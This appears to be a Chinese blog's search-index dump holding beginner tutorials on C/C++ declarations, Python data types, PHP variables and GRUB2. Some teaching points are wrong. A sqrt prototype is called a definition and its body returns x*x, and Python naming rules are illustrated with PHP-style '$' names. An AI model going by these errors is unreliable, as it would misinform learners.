halfversionedmorekeywords.py关键字前加注释","categories":[{"name":"工具手册","slug":"工具手册","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"}],"tags":[{"name":"注入工具","slug":"注入工具","permalink":"http://yoursite.com/tags/%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/"}]},{"title":"C&C++变量","slug":"c-c变量","date":"2020-02-19T16:18:29.000Z","updated":"2020-02-26T02:13:15.201Z","comments":true,"path":"2020/02/20/c-c变量/","link":"","permalink":"http://yoursite.com/2020/02/20/c-c%E5%8F%98%E9%87%8F/","excerpt":"","text":"1. 变量的定义、声明 变量的声明有两种情况： 一种是需要建立存储空间的。例如：int a。在声明的时候就已经建立了存储空间。这种声明是”定义性声明(defining declaration)”，即我们平时所说的“定义”。 另一种是不需要建立存储空间的，只是告诉编译器某变量已经在别处定义过了。例如：extern int a。其中，变量a是在别处定义的。这种声明是”引用性声明(referncing declaration)”，即我们平时所说的“声明”。 从广义的角度来讲，声明中包含着定义，但是并非所有的声明都是定义。即，定义性声明既是定义又是声明，而引用性声明只是声明。例如：int a。它既是声明，同时又是定义。然而对于 extern int a 来讲，它只是声明不是定义。 一般的情况下我们常常这样叙述，把建立空间的声明称之为”定义”，而把不需要建立存储空间的称之为”声明”。很明显这里指的声明是范围比较窄的，也就是说引用性的声明。 例子： int a; //定义性声明，分配存储空间，初值不确定 int b = 0; //定义性声明，分配存储空间，赋初值 extern int c; //引用性声明，不分配存储空间，只是告诉编译器这个变量已经在别处定义过了 2 函数的定义、声明 函数的定义和声明也是一样，定义需要分配存储空间；声明只是告诉编译器这个函数已经在别处定义过了。 函数的定义和声明比较好区分。有函数体的即为定义，不带函数体即为声明。 例子： 12345678910111213double sqrt(double x); &#x2F;&#x2F;定义 double sqrt(double x) &#123; return x*x; &#125; 3 定义与声明的区别（1）是否需要分配存储空间。 （2）在一个作用域中可以重复声明，但不能重复定义。这是由（1）决定的，可以重复几次告诉编译器某个变量、函数已经在别处定义了，但不能重复多次地让编译器为同一个变量、函数分配不同的存储空间。","categories":[{"name":"编程基础","slug":"编程基础","permalink":"http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"C&C++","slug":"C-C","permalink":"http://yoursite.com/tags/C-C/"}]},{"title":"Python变量","slug":"Python变量","date":"2020-02-17T10:39:56.000Z","updated":"2020-02-25T16:09:59.789Z","comments":true,"path":"2020/02/17/Python变量/","link":"","permalink":"http://yoursite.com/2020/02/17/Python%E5%8F%98%E9%87%8F/","excerpt":"","text":"变量的定义变量来源于数学，是计算机语言中能储存计算结果或能表示值抽象概念。变量可以通过变量名访问。 在python中，变量会在首次出现时为其赋值时被创建，无需事先声明变量的类型，变量类型是在运行过程中根据对象的类型自动决定的。在使用中，可以随意改变变量的类型。而在c语言中，变量则需要先创建才能使用，并且需要严格定义类型。 如何定义变量定义变量就是向服务器的内存申请空间，用来存储数据。这时候我们就需要用到变量名和变量值。 在python当中定义一个变量很简单，由于 python是一种动态类型语言，定义一个变量不需要声明变量类型，直接给变量赋值就相当于定义一个变量了，变量类型取决于值的类型。 变量名只有在第一次出现的时候，才是定义变量。当再次出现时，不是定义变量，而是直接使用之前定义的变量。 如下： 12In [1]: a = 1 In [2]: b = \"hello\" 在“=”左边是变量名，右边是变量值。“=”可不是我们平常所说的等号哦，在python中，=是赋值运算符 变量命名规则 变量名只能包括字母、数字和下划线。变量名不能以数字开头。如”$_name”,”$name” ,”$name2”等，但是”$9name”,”$name*”是不对的。 变量名不允许包含空格。当变量名由多个单词组成，建议使用“_”进行分隔（比如 $my_apple），俗称下划线法，或者以大写字母开头比如 $myApple，俗称骆驼式命名法（也称驼峰命名法）。 不能使用python保留的关键字及内置函数名作变量名，例如，用print作变量名是不允许的。 在Python中变量名是区分大小写的，如“$my_book”与“$my_Book”代表两个不同的变量。 变量的数据类型严格意义上讲，python只有一个类型，都继承自object。 python的标准数据类型有六种 数字类型（Number） 字符串类型 （str） 列表 （list） 元组 （tuple） 字典 （dict） 集合 （set） 数字类型（Number）Python 数字数据类型用于存储数值。 Python 支持三种不同的数值类型：整型（int）、浮点型（float）、复数（complex） 整型：通常称为整数，是整数或者负数，不带小数点。python3整型类型没有大小限制。int型数字：0、10 -780、-089、-0x270、0x90。 浮点型：浮点型由整数部分与小数部分组成。float型数字：0.0、15.2、-2.9、-32.5e10、32+e18。浮点数可以用科学计算法表示：2.5e2 = 2.5 x 10^2 = 250 复数型：复数由实数部分和虚数部分构成，可以用a + bj,或者complex(a,b)表示， 复数的实部a和虚部b都是浮点型。complex:3.14j、9.23e-35j、4.53e-7j。 python数字类型相互转换 int(x) 将x转换为一个整数。 float(x) 将x转换到一个浮点数。 complex(x) 将x转换到一个复数，实数部分为 x，虚数部分为 0。complex(x, y) 将 x 和 y 转换到一个复数，实数部分为 x，虚数部分为 y。x 和 y 是数字表达式。 python数字运算 和其他不一样的是： / ：返回的是浮点数、// :向下取整数、 ** ： 幂运算 12345678In [1]: 8/3 Out[1]: 2.6666666666666665In [2]: 8//3 Out[2]: 2In [3]: 3**3 Out[3]: 27 字符串类型 （str）双引号或者单引号中的数据，就是字符串。 1In [5]: str1 = \"hello,world\" 单字符在python中也是当做一个字符串来使用。 python访问字符串中的值 123456789In [6]: var1 = \"hello world\" In [7]: var2 = \"python3\" In [8]: print(\"var1[0]\",var1[0]) var1[0] hIn [9]: print(\"var2[3:6]\",var2[3:6]) var2[3:6] hon python字符串的分片 12345678910111213141516171819202122In [12]: str = \"string\" #获取从偏移为1到偏移为3的字符串，不包括偏移为3的字符In [13]: str[1:3] Out[13]: 'tr'#获取从偏移为1到最后的一个字符In [14]: str[1:] Out[14]: 'tring'# 获取从偏移为0的字符一直到偏移为3的字符串，不包括偏移为3的字符串In [15]: str[:3] Out[15]: 'str'#获取从偏移为0的字符一直到最后一个字符（不包括最后一个字符） In [16]: str[:-1] Out[16]: 'strin'获取字符串从开始到结尾的所有元素In [17]: str[:] Out[17]: 'string'#获取偏移为-3到偏移为-1的字符，不包括偏移为-1的字符 In [18]: str[-3:-1] Out[18]: 'in'#反转输出In [19]: str[::-1] Out[19]: 'gnirts' “+”：实现字符串的拼接 1234In [21]: string=\"hello\"+\"world\" In [22]: string Out[22]: 'helloworld' 字符串的方法 replace()方法 Python replace() 方法把字符串中的 old（旧字符串） 替换成 new(新字符串)，如果指定第三个参数max，则替换不超过 max 次。 1234567In [23]: str = \"This is A Test\" In [24]: print(str.replace(\"is\", \"was\")) Thwas was A TestIn [25]: print(str.replace(\"is\", \"was\", 1)) Thwas is A Test find() 方法检 测字符串中是否包含子字符串 str ，如果指定 beg（开始） 和 end（结束） 范围，则检查是否包含在指定范围内，如果指定范围内如果包含指定索引值，返回的是索引值在字符串中的起始位置。如果不包含索引值，返回-1。 语法： 1str.find(str,beg = 0, end = len(str)) 参数： 123str -- 指定检索的字符串beg -- 开始索引，默认为0。end -- 结束索引，默认为字符串的长度。 返回值： 如果包含子字符串返回开始的索引值，否则返回-1。 123456789101112In [26]: str1 = \"python web: www.python.org\" In [27]: str2 = \"we\" In [28]: print(str1.find(str2)) 7In [29]: print(str1.find(str2, 3)) 7In [30]: print(str1.find(str2, 8)) -1 index()方法 和find()方法相似，唯一的区别就是find方法不包含索引值会返回-1，而index()不包含索引值会抛出异常。 join()方法 连接字符串数组。将字符串、元组、列表中的元素以指定的字符(分隔符)连接生成一个新的字符串。join是重要的字符串方法，用来在队列中添加元素。注意：需要添加的元素必须都是字符串。 语法 1str.join(sequence) 12345678910111213141516In [31]: str = \"-\" In [32]: a = [1,2,4] In [33]: b = [\"a\",\"b\",\"c\"] In [34]: print(str.join(a)) -------------------------------------------------------------TypeError Traceback (most recent call last)&lt;ipython-input-34-df311844404b&gt; in &lt;module&gt;----&gt; 1 print(str.join(a))TypeError: sequence item 0: expected str instance, int foundIn [35]: print(str.join(b)) a-b-c split()方法 和join方法相反，split方法把字符串分成序列。 语法： 1str.split(str=\"\", num=string.count(str)). 参数： 12str -- 分隔符，默认为所有的空字符，包括空格、换行(\\n)、制表符(\\t)等。num -- 分割次数。 返回值 返回分割后的字符串列表 12345678910In [38]: str = \"this is a string examplei\" In [39]: print(str.split()) ['this', 'is', 'a', 'string', 'examplei']In [40]: print(str.split(\"s\",1)) ['thi', ' is a string examplei']In [41]: print(str.split(\"i\")) ['th', 's ', 's a str', 'ng example', ''] len()方法 Python len() 方法返回对象（字符、列表、元组等）长度或项目个数。 123456789In [42]: str = \"i love python\" In [43]: print(len(str)) 13In [44]: List = [1,3,5,7] In [45]: print(len(List)) 4 lower()方法 Python lower() 方法转换字符串中所有大写字符为小写。 upper()方法 Python upper() 方法转换字符串中所有小写字符为大写。 isnumeric()方法 如果 string 中只包含数字字符，则返回 True，否则返回 False isspace()方法 如果 string 中只包含空格，则返回 True，否则返回 False. 字符格式化操作 12345In [46]: age = 100 In [47]: str = \"python\" In [48]: print(\"今年%d岁\"%age,\"the string %s\"%str) 列表 （list）当我们需要存储一组数据时候，就需要用序列，序列给每个元素都分配一个索引，第一个是0，第二个是1，依次论推。常用的序列有：列表和元组，当我们需要改变序列的元素时候，就用列表，因为某些原因，序列不能修改时候，使用元组更加合适。 创建一个列表，只要把逗号分隔的不同的数据项使用方括号括起来即可。列表的数据项不需要具有相同的类型。 12345In [49]: list1 = [\"yqq\", \"boy\", 27] In [50]: list2 = [1, 2, 3, 4] In [51]: list3 = [\"a\", \"b\", \"c\"] python列表的索引 可以通过下标访问列表中的值，也能通过下标来重新赋值。字符串不能通过下边类重新赋值。 12345678910111213141516In [52]: list1 &#x3D; [&quot;yqq&quot;, &quot;boy&quot;, 27] In [53]: list1[1] &#x3D; &quot;girl&quot; In [54]: print(list1) [&#39;yqq&#39;, &#39;girl&#39;, 27]In [55]: str &#x3D; &quot;4444&quot; In [56]: str[0]&#x3D;&quot;5&quot; -------------------------------------------------------------TypeError Traceback (most recent call last)&lt;ipython-input-56-3975e41ea07c&gt; in &lt;module&gt;----&gt; 1 str[0]&#x3D;&quot;5&quot;TypeError: &#39;str&#39; object does not support item assignment python列表的分片 使用索引可以实现单个元素的访问，分片可以操作一定范围的元素。 格式：list[n, m] 123n: 提取部分的第一个元素的编号。m: 分片剩余部分的第一个元素的编号。第一个是分片的开始，m-n 是分片的个数（n:包含在分片中，m不包含字啊分片中） 12345678910111213141516171819In [57]: list = [1,2,3,4,5,6,7,8,9,10] In [58]: print(list[3:6]) [4, 5, 6]In [59]: print(list[0:1]) [1]In [60]: print(list[7:10]) [8, 9, 10]In [61]: print(list[-3:]) [8, 9, 10]In [62]: print(list[-1:]) [10]In [63]: print(list[-1]) 10 可以在分片时候，指定步长，步长可以为正数，也可以是负数。步长为负数，从右向左提取元素。 12345678910111213141516171819In [64]: list = [1,2,3,4,5,6,7,8,9,10] In [65]: print(list[::2]) [1, 3, 5, 7, 9]In [66]: print(list[::-1]) [10, 9, 8, 7, 6, 5, 4, 3, 2, 1]In [67]: print(list[8:3:-1]) [9, 8, 7, 6, 5]In [68]: print(list[0:10:-2]) []In [69]: print(list[5::-2]) [6, 4, 2]In [70]: print(list[:5:-2]) [10, 8] 序列相加 只有相同类型的序列才能相加 12345678910In [71]: [1,2]+[3,4] Out[71]: [1, 2, 3, 4]In [72]: [1,2,3]+\"hello\" -------------------------------------------------------------TypeError Traceback (most recent call last)&lt;ipython-input-72-2fc4711a9bef&gt; in &lt;module&gt;----&gt; 1 [1,2,3]+\"hello\"TypeError: can only concatenate list (not \"str\") to list 序列迭代 依次输出列表的元素 123456In [75]: for x in [1, 2, 3]: ...: print(x) ...: 123 删除元素 del 语句来删除元素 123456In [76]: list1 &#x3D; [&#39;physics&#39;, &#39;chemistry&#39;, 1997, 2000] In [77]: del list1[2] In [78]: list1 Out[78]: [&#39;physics&#39;, &#39;chemistry&#39;, 2000] python列表的函数 len(list) 列表元素个数 max(list) 列表元素的最大值 min(list) 列表元素的最小值 list(seq) 把seq转化为列表 12345678910In [1]: aTuple = (123, 'Google', 'Runoob', 'Taobao') In [2]: list1 = list(aTuple) In [3]: print (\"列表元素 : \", list1) 列表元素 : [123, 'Google', 'Runoob', 'Taobao']In [4]: str=\"Hello World\" In [5]: list2=list(str) python列表包含的函数 list.append(obj) 列表的末尾添加新的对象 12345678910111213In [6]: List &#x3D;[1,2,3,4] In [7]: List1 &#x3D;[3,4,5] In [8]: List.append(5) In [9]: print(List) [1, 2, 3, 4, 5]In [10]: List.append(List1) In [11]: print(List) [1, 2, 3, 4, 5, [3, 4, 5]] list.extend(seq) 在列表末尾一次性追加另一个序列中的多个值 12345678910111213In [12]: List =[1,2,3,4] In [13]: List1 =[3,4,5] In [14]: List.extend(List1) In [15]: print(List) [1, 2, 3, 4, 3, 4, 5]In [16]: List.append(List1) In [17]: print(List) [1, 2, 3, 4, 3, 4, 5, [3, 4, 5]] list.insert(index,obj) 函数用于将指定对象插入列表的指定位置。 12345678In [18]: List =[1,2,3,4] In [19]: List1 =[3,4,5] In [20]: List.insert(3, List1) In [21]: print(List) [1, 2, 3, [3, 4, 5], 4] list.insert(index,obj) 函数用于将指定对象插入列表的指定位置。 12345678In [22]: List &#x3D;[1,2,3,4] In [23]: List1 &#x3D;[3,4,5] In [24]: List.insert(3, List1) In [25]: print(List) [1, 2, 3, [3, 4, 5], 4] list.pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。 1234567In [26]: list1=[1,2,3,4,5,6,6,7,8] In [27]: list1.pop() Out[27]: 8In [28]: list1 Out[28]: [1, 2, 3, 4, 5, 6, 6, 7] list.remove(obj) 函数用于移除列表中某个值的第一个匹配项。 123456In [29]: list1=[1,2,3,4,5,6,6,7,8] In [30]: list1.remove(6) In [31]: list1 Out[31]: [1, 2, 3, 4, 5, 6, 7, 8] list.count(obj) 用于统计某个元素在列表中出现的次数。 1234In [38]: list1=[1,2,3,4,5,6,6,7,8] In [39]: list1.count(6) Out[39]: 2 元组 （tuple）某些情况下，我们需要的序列不可修改，这个时候，就需要用元组，元组和列表相似，但是元组的元素值不可修改也不能删除，可以进行分片和连接。 元组创建很简单，用小括号括起来，用逗号隔开。元组使用小括号，列表使用中括号。 1In [45]: Tuple = (\"a\",\"b\",\"c\",\"d\") 注意：一个元素的元组，后边加一个“,”。 1In [47]: Tuple =(30,) 访问元组 12345678910&gt;In [48]: tuple = (\"abcd\",1,[1,2,4]) In [49]: tuple[0] Out[49]: 'abcd'In [50]: tuple[1] Out[50]: 1In [51]: tuple[2] Out[51]: [1, 2, 4] 元组合并 In [52]: tuple = (“abcd”,1,[1,2,4]) In [53]: tuple1 =(“ad”,3,4) In [54]: tuple + tuple1 Out[54]: (‘abcd’, 1, [1, 2, 4], ‘ad’, 3, 4) 删除元组 元组的元素不允许删除，但是我们可以删除整个元组。 123In [55]: tuple &#x3D; (&quot;abcd&quot;,1,[1,2,4]) In [56]: del tuple 任意的以“，”分开的序列，默认是元组。 1234In [57]: a &#x3D; 1,2,3,4 In [58]: a Out[58]: (1, 2, 3, 4) 元组的函数 tuple()方法 Python 元组 tuple() 函数将列表转换为元组。 字典 （dict）列表中元素通过下标进行定位，但是元素位置发生变化，则很难定位，python提供一种新的类型，那就是字典。字典中元素可以通过 key 访问。 说明： 字典是由花括号括起来的包含，key : value 两部分。 dict = {‘name’:’班长’, ‘id’:100, ‘sex’:’f’, ‘address’:’地球亚洲中国北京’} 字典和列表一样，也能够存储多个数据 列表中找某个元素时，是根据下标进行的 字典中找某个元素时，是根据’名字’（就是冒号:前面的那个值，例如上面代码中的’name’、’id’、’sex’） 访问字典的值 1234In [59]: dict &#x3D; &#123;&quot;name&quot;:&quot;yqq&quot;, &quot;age&quot;:27&#125; In [60]: print(dict[&quot;name&quot;],dict[&quot;age&quot;]) yqq 27 修改字典 通过 key 来修改值。 1234567891011In [61]: dict = &#123;\"name\":\"yqq\", \"age\":27&#125; In [62]: dict[\"age\"] =25 In [63]: print(dict) &#123;'name': 'yqq', 'age': 25&#125;In [64]: dict[\"school\"] =\"bj\" In [65]: print(dict) &#123;'name': 'yqq', 'age': 25, 'school': 'bj'&#125; 删除字典或者元素 del dict[key] #删除 key 条目 del dict #删除字典 dict.clear() #清除所有条目 字典的方法 dict.len() 测量字典中，键值对的个数。 dict.values() 返回一个包含字典所有value的列表 dict.keys() 返回一个包含字典所有KEY的列表 dict.items() 返回一个包含所有（键，值）元组的列表 字典的遍历 遍历键、遍历值、遍历项、遍历键值对 123456789101112131415161718192021222324252627In [66]: for key in dict.keys(): ...: print(key) ...: nameageschoolIn [67]: for value in dict.values(): ...: print(value) ...: yqq25bjIn [68]: for item in dict.items(): ...: print(item) ...: ('name', 'yqq')('age', 25)('school', 'bj')In [69]: for key,value in dict.items(): ...: print(\"key=%s\"%key,\"value=%s\"%value) ...: key=name value=yqqkey=age value=25key=school value=bj 集合 （set）集合（set）是一个无序的不重复元素序列。 可以使用大括号 { } 或者 set(#可迭代对象) 函数创建集合，注意：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典。 12345678910111213141516171819In [72]: a=&#123;1,2,3,4,5,6,6&#125; In [73]: a Out[73]: &#123;1, 2, 3, 4, 5, 6&#125;In [74]: b=set() In [77]: s Out[77]: &#123;'A', 'B', 'C'&#125;In [78]: s = set([1,0,3.14,\"hello\"]) In [79]: s Out[79]: &#123;0, 1, 3.14, 'hello'&#125;In [81]: c=set(\"12345678\") In [82]: c Out[82]: &#123;'1', '2', '3', '4', '5', '6', '7', '8'&#125; 集合的运算 交集，并集，补集，子集，超集 交集 - &amp; 12345678In [86]: s1 = &#123;1,2,3&#125; In [87]: s2 = &#123;2,3,4&#125; In [88]: s3 = s1 &amp; s2 In [89]: s3 Out[89]: &#123;2, 3&#125; 并集 - | 12345678In [93]: s1 = &#123;1,2,3&#125; In [94]: s2 = &#123;2,3,4&#125; In [95]: s3 = s1 | s2 In [96]: s3 Out[96]: &#123;1, 2, 3, 4&#125; 补集 - - 12345678In [97]: s1 = &#123;1,2,3&#125; In [98]: s2 = &#123;2,3,4&#125; #生成属于s1 但 不属于s2的所有的元素In [99]: s3 = s1 - s2 In [100]: s3 Out[100]: &#123;1&#125; 对称补集 - ^ 12345678In [101]: s1 = &#123;1,2,3&#125; In [102]: s2 = &#123;2,3,4&#125; In [103]: s3 = s1 ^ s2 In [104]: s3 Out[104]: &#123;1, 4&#125; 超集 &gt; 子集 &lt; 123456789In [105]: s1 = &#123;1,2,3&#125; In [106]: s2 = &#123;2,3&#125; In [107]: s1 &gt; s2 Out[107]: TrueIn [108]: s1 &lt; s2 Out[108]: False 集合的相等 == 集合的不等 != 成员运算in , not in 等同于字典 in , not in 目的：判断某个值在集合中存在 / 不存在 用于集合的内建函数 len(set) : 集合内元素的个数 max(set) : 最大值 min(set) : 最小值 sum(set) : 和 any(set) : 任何一个元素为真，则返回真 all(set) : 所有元素为真，则返回真 元组方法 add()方法 向集合内增加元素，如果添加的元素已经存在的话，则不执行任何操作 集合对象.add(elem) elem 表示要增加的元素 clear()方法 清空集合内所有的元素 集合对象.clear() copy()方法 复制一个集合 difference()方法 返回两个集合的补集 集合对象1.difference(集合对象2)参数 ：集合对象2 ，表示计算补集的另外一个集合返回值 ：补集结果，即出现在集合1中但没出现在集合2中的元素集合等同于： 集合对象1 - 集合对象2","categories":[{"name":"编程基础","slug":"编程基础","permalink":"http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"PHP变量","slug":"PHP变量","date":"2020-02-17T09:48:27.000Z","updated":"2020-02-25T16:09:48.019Z","comments":true,"path":"2020/02/17/PHP变量/","link":"","permalink":"http://yoursite.com/2020/02/17/PHP%E5%8F%98%E9%87%8F/","excerpt":"","text":"变量的定义变量来源于数学，是计算机语言中能储存计算结果或能表示值抽象概念。变量可以通过变量名访问。 在php中，变量会在首次出现时为其赋值时被创建，无需事先声明变量的类型，变量类型是在运行过程中根据对象的类型自动决定的。在使用中，可以随意改变变量的类型。而在c语言中，变量则需要先创建才能使用，并且需要严格定义类型。 如何定义变量定义变量就是向服务器的内存申请空间，用来存储数据。这时候我们就需要用到变量名和变量值。 变量名只有在第一次出现的时候，才是定义变量。当再次出现时，不是定义变量，而是直接使用之前定义的变量。 如下： 1234&lt;?php$var_name = “php”$n = 10;?&gt; 在“=”左边是变量名，右边是变量值，完成定义变量后，需要一个；告诉服务器这行指令已经结束。其中变量名必须通过$符号标识；“=”可不是我们平常所说的等号哦，在PHP中，=是赋值运算符 变量命名规则变量名除了需要“$”进行标识外，还有一些规则需要遵守。变量名的命名规则主要有三条： 变量名只能包括字母、数字和下划线。变量名不能以数字开头。如”$_name”,”$name” ,”$name2”等，但是”$9name”,”$name*”是不对的。 变量名不允许包含空格。当变量名由多个单词组成，建议使用“_”进行分隔（比如 $my_apple），俗称下划线法，或者以大写字母开头比如 $myApple，俗称骆驼式命名法（也称驼峰命名法）。 不能使用PHP 保留关键字中它们的任何一个作为常量、方法名或是类名。但是可以将它们作为变量名使用，不过这样会导致混淆。 在PHP中变量名是区分大小写的，如“$my_book”与“$my_Book”代表两个不同的变量。 变量的数据类型在变量中，由于变量占用的空间单元不一样（占的地盘大小不一样），也分成几种数据类型，我们可以通过使用“memory_get_usage”获取当前PHP消耗的内存。 PHP是一门松散类型的语言，不必声明变量的数据类型，PHP会自动把变量转换为自动的数据类型，而C语言或者JAVA语言，在声明变量的时候需要声明变量的数据类型。 在PHP中，支持8种原始类型，其中包括四种标量类型、两种复合类型和两种特殊类型。 四种标量类型： 布尔（Boolean） 整型（Integer） 浮点型（Float） 字符串（String） 两种复合类型： 数组（Array） 对象（object） 两种特殊类型 资源（Resource） NULL（NULL） 标量类型—布尔类型（Boolean）布尔类型（boolean）：只有两个值，一个是TRUE，另一个FALSE，可以理解为是或否。它不区分大小写，也就是说”TRUE”和“true”效果是一样的。主要用在条件结构中，例如判断是否满足条件的时候，是用“true”表示满足，用“false”表示不满足。需要注意的是，当我们用”echo”指令输出布尔类型时，如果是“true”则输出的是“1”，“false”则什么也不输出。我们可以使用“var_dump”函数，获取它真正的数据类型。 输入： 123456789&lt;?php$man = \"男\";$flag = $man ==\"男\";echo $flag ;echo \"&lt;br /&gt;\" ;var_dump($flag);?&gt;输出： 输出： 121bool(true) 标量类型—整型整型（integer）：类似于常见的整数。它可以用十进制、八进制、十六进制指定。十进制就是日常使用的数字；八进制，数字前必须加上“0”；十六进制，数字前必须加“0x” 。 标量类型—浮点型浮点型（Float）：就是通常说的小数，可以用小数点或者科学计数法表示。科学计数法可以使用小写的e，也可以使用大写的E。 标量类型—字符串字符串（String）：字符串是由一系列字符组成，在PHP中，字符和字节一样，也就是说，一共有256种不同字符的可能性。 字符串型可以用三种方法定义：单引号形式、双引号形式和Heredoc结构形式。 注意： 当字符串中包含引号的时： 在单引号中嵌入双引号 在双引号中嵌入单引号 使用转义符“\\” 当字符串中包含$时： 当双引号中包含变量时，变量会与双引号中的内容连接在一起 当单引号中包含变量时，变量会被当做字符串输出 输入： 12345678&lt;?php$love = \"I love you!\";$string1 = \"慕课网,$love\";$string2 = '慕课.$love';echo $string1;echo \"&lt;br /&gt;\";echo $string2;?&gt; 输出： 12慕课网,I love you!慕课.$love 当我的字符串很长时： 我们可以使用Heredoc结构（文本结构）形式的方法来解决该问题，首先使用定界符表示字符串（&lt;&lt;&lt;），接着在“&lt;&lt;&lt;“之后提供一个标识符（任意，但与结尾处必须一样），然后是字符串，最后以提供的这个标识符结束字符串。 复合类型—数组数组（array）：数组是一个很特殊的数据类型，可以在一个变量中存储多个数据。在php中，使用array()函数来创建数组。 复合类型—对象对象（object）：对象也是一种特殊的数据类型，是存储数据和有关如何处理数据的信息的数据类型。在php中，创建对象用new关键字。 特殊类型—资源资源（resource）：资源是由专门的函数来建立和使用的，例如打开文件、数据连接、图形画布。我们可以对资源进行操作（创建、使用和释放）。任何资源，在不需要的时候应该被及时释放。如果我们忘记了释放资源，系统自动启用垃圾回收机制，在页面执行完毕后回收资源，以避免内存被消耗殆尽。 如： 12345&lt;?php$file=fopen(\"f.txt\",\"r\"); //打开文件$con=mysql_connect(\"localhost\",\"root\",\"root\"); //连接数据库$img=imagecreate(100,100);//图形画布?&gt; 特殊类型—空类型NULL（NULL）：NULL是空类型，对大小写不敏感，NULL类型只有一个取值，表示一个变量没有值，当被赋值为NULL，或者尚未被赋值，或者被unset()，这三种情况下变量被认为为NULL。","categories":[{"name":"编程基础","slug":"编程基础","permalink":"http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"}]},{"title":"GRUB手册","slug":"GRUB手册","date":"2020-02-08T15:40:46.000Z","updated":"2020-02-26T02:04:27.819Z","comments":true,"path":"2020/02/08/GRUB手册/","link":"","permalink":"http://yoursite.com/2020/02/08/GRUB%E6%89%8B%E5%86%8C/","excerpt":"","text":"1 基础内容1.1 grub2和grub的区别官方手册原文：https://www.gnu.org/software/grub/manual/html_node/Changes-from-GRUB-Legacy.html#Changes-from-GRUB-Legacy 只说明几个主要的： 1.配置文件的名称改变了。在grub中，配置文件为grub.conf或menu.lst(grub.conf的一个软链接)，在grub2中改名为grub.cfg。 2.grub2增添了许多语法，更接近于脚本语言了，例如支持变量、条件判断、循环。 3.grub2中，设备分区名称从1开始，而在grub中是从0开始的。 4.grub2使用img文件，不再使用grub中的stage1、stage1.5和stage2。 5.支持图形界面配置grub，但要安装grub-customizer包，epel源提供该包。 6.在已进入操作系统环境下，不再提供grub命令，也就是不能进入grub交互式界面，只有在开机时才能进入，算是一大缺憾。 7.在grub2中没有了好用的find命令，算是另一大缺憾。 1.2 命名习惯和文件路径表示方式官方手册原文：https://www.gnu.org/software/grub/manual/html_node/Naming-convention.html#Naming-convention 1234567(fd0) ：表示第一块软盘(hd0,msdos2) ：表示第一块硬盘的第二个mbr分区。grub2中分区从1开始编号，传统的grub是从0开始编号的(hd0,msdos5) ：表示第一块硬盘的第一个逻辑分区(hd0,gpt1) ：表示第一块硬盘的第一个gpt分区&#x2F;boot&#x2F;vmlinuz ：相对路径，基于根目录，表示根目录下的boot目录下的vmlinuz， ：如果设置了根目录变量root为(hd0,msdos1)，则表示(hd0,msdos1)&#x2F;boot&#x2F;vmlinuz(hd0,msdos1)&#x2F;boot&#x2F;vmlinuz：绝对路径，表示第一硬盘第一分区的boot目录下的vmlinuz文件 1.3 grub2引导操作系统的方式官方手册原文：https://www.gnu.org/software/grub/manual/html_node/General-boot-methods.html#General-boot-methods grub2支持两种方式引导操作系统： 直接引导：(direct-load)直接通过默认的grub2 boot loader来引导写在默认配置文件中的操作系统 链式引导：(chain-load)使用默认grub2 boot loader链式引导另一个boot loader，该boot loader将引导对应的操作系统 一般只使用第一种方式，只有想引导grub默认不支持的操作系统时才会使用第二种方式。 1.4 grub2程序和传统grub程序安装后的文件分布在传统grub软件安装完后，在/usr/share/grub/RELEASE/目录下会生成一些stage文件。 123[root@xuexi ~]# ls &#x2F;usr&#x2F;share&#x2F;grub&#x2F;x86_64-redhat&#x2F;e2fs_stage1_5 ffs_stage1_5 jfs_stage1_5 reiserfs_stage1_5 stage2 ufs2_stage1_5 xfs_stage1_5fat_stage1_5 iso9660_stage1_5 minix_stage1_5 stage1 stage2_eltorito vstafs_stage1_5 在grub2软件安装完后，会在/usr/lib/grub/i386-pc/目录下生成很多模块文件和img文件，还包括一些lst列表文件。 12345678910111213141516171819202122[root@server7 ~]# ls &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;*.mod | wc -l257[root@server7 ~]# ls -lh &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;*.lst -rw-r--r--. 1 root root 3.7K Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;command.lst-rw-r--r--. 1 root root 936 Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;crypto.lst-rw-r--r--. 1 root root 214 Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;fs.lst-rw-r--r--. 1 root root 5.1K Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;moddep.lst-rw-r--r--. 1 root root 111 Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;partmap.lst-rw-r--r--. 1 root root 17 Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;parttool.lst-rw-r--r--. 1 root root 202 Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;terminal.lst-rw-r--r--. 1 root root 33 Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;video.lst[root@server7 ~]# ls -lh &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;*.img-rw-r--r--. 1 root root 512 Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;boot_hybrid.img-rw-r--r--. 1 root root 512 Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;boot.img-rw-r--r--. 1 root root 2.0K Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;cdboot.img-rw-r--r--. 1 root root 512 Nov 24 2015 